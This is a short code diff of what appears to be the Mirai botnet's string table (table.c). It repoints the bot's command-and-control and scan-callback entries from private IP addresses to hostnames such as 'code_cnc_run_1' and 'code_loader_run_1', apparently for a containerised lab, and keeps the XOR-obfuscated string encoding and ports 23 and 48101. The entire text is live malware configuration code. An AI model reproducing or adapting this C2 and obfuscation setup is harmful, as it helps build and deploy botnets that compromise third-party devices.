@@ -16,13 +16,15 @@ struct table_value table[TABLE_MAX_KEYS];
 void table_init(void)
 {
     // add_entry(TABLE_CNC_DOMAIN, "\x41\x4C\x41\x0C\x41\x4A\x43\x4C\x45\x47\x4F\x47\x0C\x41\x4D\x4F\x22", 30); // cnc.changeme.com
-    add_entry(TABLE_CNC_DOMAIN, "\x13\x15\x10\x0C\x10\x17\x0C\x12\x0C\x10\x22", 11); // search for CNC @ 172.25.0.2
+    // add_entry(TABLE_CNC_DOMAIN, "\x13\x15\x10\x0C\x10\x17\x0C\x12\x0C\x10\x22", 11); // search for CNC @ 172.25.0.2
     // add_entry(TABLE_CNC_DOMAIN, "\x12\x0C\x12\x0C\x12\x0C\x12\x22", 8);
+    add_entry(TABLE_CNC_DOMAIN, "\x41\x4D\x46\x47\x7D\x41\x4C\x41\x7D\x50\x57\x4C\x7D\x13\x22", 15); // code_cnc_run_1
     add_entry(TABLE_CNC_PORT, "\x22\x35", 2);   // 23
 
     // add_entry(TABLE_SCAN_CB_DOMAIN, "\x50\x47\x52\x4D\x50\x56\x0C\x41\x4A\x43\x4C\x45\x47\x4F\x47\x0C\x41\x4D\x4F\x22", 29); // report.changeme.com
-    add_entry(TABLE_SCAN_CB_DOMAIN, "\x13\x15\x10\x0C\x10\x17\x0C\x12\x0C\x11\x22", 11); // search for SCANLOADER @ 172.25.0.3
+    // add_entry(TABLE_SCAN_CB_DOMAIN, "\x13\x15\x10\x0C\x10\x17\x0C\x12\x0C\x11\x22", 11); // search for SCANLOADER @ 172.25.0.3
     // add_entry(TABLE_SCAN_CB_DOMAIN, "\x12\x0C\x12\x0C\x12\x0C\x12\x22", 8);
+    add_entry(TABLE_SCAN_CB_DOMAIN, "\x41\x4D\x46\x47\x7D\x4E\x4D\x43\x46\x47\x50\x7D\x50\x57\x4C\x7D\x13\x22", 18); // code_loader_run_1
     add_entry(TABLE_SCAN_CB_PORT, "\x99\xC7", 2);         // 48101
 
     add_entry(TABLE_EXEC_SUCCESS, "\x4E\x4B\x51\x56\x47\x4C\x4B\x4C\x45\x02\x56\x57\x4C\x12\x22", 15);
